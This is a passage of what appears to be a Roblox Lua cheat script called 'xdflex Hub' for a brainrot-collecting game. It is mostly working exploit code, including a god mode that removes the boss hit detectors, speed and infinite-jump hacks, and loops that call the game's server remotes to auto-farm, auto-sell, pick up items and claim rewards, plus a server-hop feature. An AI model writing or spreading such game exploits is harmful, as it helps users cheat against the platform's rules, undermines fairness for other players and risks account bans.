                humanoid:MoveTo(Vector3.new(710, 39, -2122))
                
                local ownedModel = nil
                repeat
                    task.wait(0.3)
                    for _, obj in ipairs(modelsFolder:GetChildren()) do
                        if obj:IsA("Model") and obj:GetAttribute("OwnerId") == lp.UserId then
                            ownedModel = obj
                            break
                        end
                    end
                until ownedModel ~= nil or not autoFarmBrain
                
                if not autoFarmBrain then return end
                
                if ownedModel.PrimaryPart then ownedModel:SetPrimaryPartCFrame(target.CFrame)
                else
                    local part = ownedModel:FindFirstChildWhichIsA("BasePart")
                    if part then part.CFrame = target.CFrame end
                end
                
                task.wait(0.7)
                if ownedModel and ownedModel.Parent == modelsFolder then
                    if ownedModel.PrimaryPart then ownedModel:SetPrimaryPartCFrame(target.CFrame * CFrame.new(0, -5, 0))
                    else
                        local part = ownedModel:FindFirstChildWhichIsA("BasePart")
                        if part then part.CFrame = target.CFrame * CFrame.new(0, -5, 0) end
                    end
                end
                
                repeat task.wait(0.3) until not autoFarmBrain or (ownedModel == nil or ownedModel.Parent ~= modelsFolder)
                if not autoFarmBrain then return end
                
                local oldCharacter = lp.Character
                repeat task.wait(0.2) until not autoFarmBrain or (lp.Character ~= oldCharacter and lp.Character ~= nil)
                if not autoFarmBrain then return end
                task.wait(0.4)
                
                local newChar = lp.Character
                local newRoot = newChar:WaitForChild("HumanoidRootPart")
                newRoot.CFrame = CFrame.new(737, 39, -2118)
                task.wait(2.1)
            end)
        end
    end)
end)

local BossDetectorCard = CreateCard(PageBrainrots, "GOD MODE", "NOOB BOSS CANT KILL U")
local storedBossParts = {}
AddToggle(BossDetectorCard, Config.GodMode, function(state)
    Config.GodMode = state
    SaveConfig()
    local folder = workspace:WaitForChild("BossTouchDetectors")
    if state then
        storedBossParts = {}
        for _, obj in ipairs(folder:GetChildren()) do
            if obj.Name ~= "base14" then
                table.insert(storedBossParts, obj)
                obj.Parent = nil
            end
        end
    else
        for _, obj in ipairs(storedBossParts) do
            if obj then obj.Parent = folder end
        end
        storedBossParts = {}
    end
end)

local SellHeldCard = CreateCard(PageBrainrots, "Sell Held Brainrot", "SELL BRAINROTS IN UR HAND")
AddButton(SellHeldCard, "SELL", function()
    local character = lp.Character
    if not character then return end
    local tool = character:FindFirstChildOfClass("Tool")
    if not tool then
        SendNotification("Error", "Please equip the Brainrot you want to sell!", 3)
        return
    end
    local entityId = tool:GetAttribute("EntityId")
    if entityId then
        local sell = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("InventoryService"):WaitForChild("RF"):WaitForChild("SellBrainrot")
        pcall(function() sell:InvokeServer(entityId) end)
        SendNotification("Sold!", "Successfully sold: " .. tool.Name, 3)
    end
end)

local PickupCard = CreateCard(PageBrainrots, "Pickup All Brainrots", "Pick up brainrots from your plot")
AddButton(PickupCard, "PICKUP", function()
    pcall(function()
        local plotsFolder = workspace:WaitForChild("Plots")
        local myPlot
        for i = 1, 5 do
            local plot = plotsFolder:FindFirstChild(tostring(i))
            if plot and plot:FindFirstChild(tostring(i)) then
                local inner = plot[tostring(i)]
                for _, v in pairs(inner:GetDescendants()) do
                    if v:IsA("BillboardGui") and string.find(v.Name, lp.Name) then
                        myPlot = inner
                        break
                    end
                end
            end
            if myPlot then break end
        end
        if not myPlot then return end
        local containers = myPlot:FindFirstChild("Containers")
        if not containers then return end
        
        local pickup = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ContainerService"):WaitForChild("RF"):WaitForChild("PickupBrainrot")
        for i = 1, 30 do
            local containerFolder = containers:FindFirstChild(tostring(i))
            if containerFolder and containerFolder:FindFirstChild(tostring(i)) then
                local container = containerFolder[tostring(i)]
                local innerModel = container:FindFirstChild("InnerModel")
                if innerModel and #innerModel:GetChildren() > 0 then
                    pickup:InvokeServer(tostring(i))
                    task.wait(0.1)
                end
            end
        end
        SendNotification("Pickup", "Picked up all Brainrots!", 3)
    end)
end)

local AutoSellCard = CreateCard(PageBrainrots, "Auto Sell All Brainrots", "Automatically sells everything in inventory", 120)
local autoSellAll = Config.AutoSellAll
local sellDelay = Config.AutoSellDelay

AddToggle(AutoSellCard, Config.AutoSellAll, function(state)
    Config.AutoSellAll = state
    SaveConfig()
    autoSellAll = state
    if state then
        task.spawn(function()
            local sellService = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("InventoryService"):WaitForChild("RF"):WaitForChild("SellBrainrot")
            while autoSellAll do
                pcall(function()
                    local tools = {}
                    for _, item in ipairs(lp.Backpack:GetChildren()) do if item:IsA("Tool") then table.insert(tools, item) end end
                    if lp.Character then
                        for _, item in ipairs(lp.Character:GetChildren()) do if item:IsA("Tool") then table.insert(tools, item) end end
                    end
                    for _, tool in ipairs(tools) do
                        local entityId = tool:GetAttribute("EntityId")
                        if entityId then
                            sellService:InvokeServer(entityId)
                            task.wait(0.05)
                        end
                    end
                end)
                task.wait(sellDelay)
            end
        end)
    end
end)

AddSlider(AutoSellCard, 1, 10, Config.AutoSellDelay, function(val)
    sellDelay = val
    Config.AutoSellDelay = val
    SaveConfig()
end)


--// ================== PLAYER TAB ==================
local SpeedCard = CreateCard(PagePlayer, "WalkSpeed Manager", "Toggle and customize your speed", 130)

local speedEnabled = Config.WalkSpeedEnabled
local speedValue = Config.WalkSpeed

AddToggle(SpeedCard, Config.WalkSpeedEnabled, function(state)
    Config.WalkSpeedEnabled = state
    SaveConfig()
    speedEnabled = state
    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
        lp.Character.Humanoid.WalkSpeed = speedEnabled and speedValue or 16
    end
end)

local InputBox = Instance.new("TextBox", SpeedCard)
InputBox.Size = UDim2.fromOffset(60, 25)
InputBox.Position = UDim2.new(1, -125, 0.2, 0)
InputBox.BackgroundColor3 = Theme.Background
InputBox.TextColor3 = Theme.Text
InputBox.Text = tostring(speedValue)
InputBox.Font = Enum.Font.GothamBold
InputBox.TextSize = 12
Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 4)
local InputStroke = Instance.new("UIStroke", InputBox)
InputStroke.Color = Theme.Border

InputBox.FocusLost:Connect(function(enterPressed)
    local num = tonumber(InputBox.Text)
    if num then
        speedValue = num
        Config.WalkSpeed = num
        SaveConfig()
        if speedEnabled and lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.WalkSpeed = speedValue
        end
        SendNotification("Speed Updated", "Set to: " .. num, 2)
    else
        InputBox.Text = tostring(speedValue)
    end
end)

AddSlider(SpeedCard, 16, 250, Config.WalkSpeed, function(val)
    speedValue = val
    Config.WalkSpeed = val
    SaveConfig()
    InputBox.Text = tostring(val)
    if speedEnabled and lp.Character and lp.Character:FindFirstChild("Humanoid") then
        lp.Character.Humanoid.WalkSpeed = val
    end
end)

RunService.Stepped:Connect(function()
    pcall(function()
        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            if speedEnabled then
                lp.Character.Humanoid.WalkSpeed = speedValue
            end
        end
    end)
end)

local JumpCard = CreateCard(PagePlayer, "Infinite Jump", "Jump in mid-air")
local infJump = Config.InfJump
AddToggle(JumpCard, Config.InfJump, function(state) 
    Config.InfJump = state
    SaveConfig()
    infJump = state 
end)

UserInputService.JumpRequest:Connect(function()
    if infJump and lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
        lp.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

local ACPRCard = CreateCard(PagePlayer, "Auto Claim Playtime Rewards", "Claims playtime gifts automatically")
local autoClaimingPlaytime = Config.AutoClaimPlaytime
AddToggle(ACPRCard, Config.AutoClaimPlaytime, function(state)
    Config.AutoClaimPlaytime = state
    SaveConfig()
    autoClaimingPlaytime = state
    if not state then return end
    task.spawn(function()
        local claimGift = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PlaytimeRewardService"):WaitForChild("RF"):WaitForChild("ClaimGift")
        while autoClaimingPlaytime do
            for reward = 1, 12 do
                if not autoClaimingPlaytime then break end
                pcall(function() claimGift:InvokeServer(reward) end)
                task.wait(0.25)
            end
            task.wait(1)
        end
    end)
end)

local ACEPRCard = CreateCard(PagePlayer, "Auto Claim Event Pass", "Claims free event pass rewards")
local autoClaimingPass = Config.AutoClaimPass
AddToggle(ACEPRCard, Config.AutoClaimPass, function(state)
    Config.AutoClaimPass = state
    SaveConfig()
    autoClaimingPass = state
    if not state then return end
    task.spawn(function()
        local claimPass = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("SeasonPassService"):WaitForChild("RF"):WaitForChild("ClaimPassReward")
        while autoClaimingPass do
            pcall(function()
                local gui = lp:WaitForChild("PlayerGui"):WaitForChild("Windows"):WaitForChild("Event"):WaitForChild("Frame"):WaitForChild("Frame"):WaitForChild("Windows"):WaitForChild("Pass"):WaitForChild("Main"):WaitForChild("ScrollingFrame")
                for i = 1, 10 do
                    if not autoClaimingPass then break end
                    local item = gui:FindFirstChild(tostring(i))
                    if item and item:FindFirstChild("Frame") and item.Frame:FindFirstChild("Free") then
                        local free = item.Frame.Free
                        local locked = free:FindFirstChild("Locked")
                        local claimed = free:FindFirstChild("Claimed")
                        if claimed and claimed.Visible then continue end
                        if locked and not locked.Visible then
                            claimPass:InvokeServer("Free", i)
                        end
                    end
                end
            end)
            task.wait(0.5)
        end
    end)
end)
--// ================== MISC TAB ==================
local HopCard = CreateCard(PageMisc, "Server Hop", "Join a different server")
local HopBtn = AddButton(HopCard, "HOP", function()
    SendNotification("Server Hop", "Searching for a new server...", 3)
    local url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet(url))
        for _, server in ipairs(data.data) do
            if server.playing < server.maxPlayers and server.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, lp)
                return
            end
        end
    end)
end)

local DiscordCard = CreateCard(PageMisc, "Discord Server", "Join our community!")
AddButton(DiscordCard, "COPY LINK", function()
    if setclipboard then
        setclipboard(DISCORD_LINK)
        SendNotification("Discord", "Invite link copied to clipboard!", 3)
    end
end)

SendNotification("Welcome Back!", "xdflex Hub loaded successfully.", 4)
